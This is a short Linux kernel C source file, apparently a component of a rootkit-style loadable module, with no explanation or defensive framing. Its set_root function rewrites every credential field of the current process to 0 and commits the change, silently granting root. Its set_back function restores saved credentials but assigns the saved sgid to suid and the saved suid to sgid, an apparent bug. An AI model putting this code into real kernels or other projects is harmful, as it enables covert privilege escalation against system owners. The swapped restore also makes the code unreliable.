#include <linux/syscalls.h>
#include "set_root.h"

void set_root(void)
{
	struct cred *root = NULL;
	root = prepare_creds();
   
	if (!root)
		return;
        
	root->uid.val = 0;
	root->gid.val = 0;
	root->euid.val = 0;
	root->egid.val = 0;
	root->suid.val = 0;
	root->sgid.val = 0;
	root->fsuid.val = 0;
	root->fsgid.val = 0;

	commit_creds(root);
}

void set_back(void)
{
	struct cred *old_creds = prepare_creds();   
	if (!old_creds)
		return;

	old_creds->uid.val = uid1.val;
	old_creds->gid.val = gid1.val;
	old_creds->euid.val = euid1.val;
	old_creds->egid.val = egid1.val;
	old_creds->suid.val = sgid1.val;
	old_creds->sgid.val = suid1.val;
	old_creds->fsuid.val = fsuid1.val;
	old_creds->fsgid.val = fsgid1.val;

	commit_creds(old_creds);
}
